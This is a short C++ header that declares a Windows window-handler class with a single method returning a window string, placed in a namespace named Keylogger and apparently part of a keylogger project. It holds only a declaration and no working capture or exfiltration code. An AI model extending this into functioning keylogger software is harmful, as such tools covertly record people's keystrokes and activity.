#ifndef WINDOW_HANDLER_WINDOWS_H
#define WINDOW_HANDLER_WINDOWS_H

#include "IWindowHandler.h"

namespace Keylogger {

class WindowHandlerWindows : public IWindowHandler {
 public:
    std::string getWindowString();
};

}

#endif // WINDOW_HANDLER_WINDOWS_H
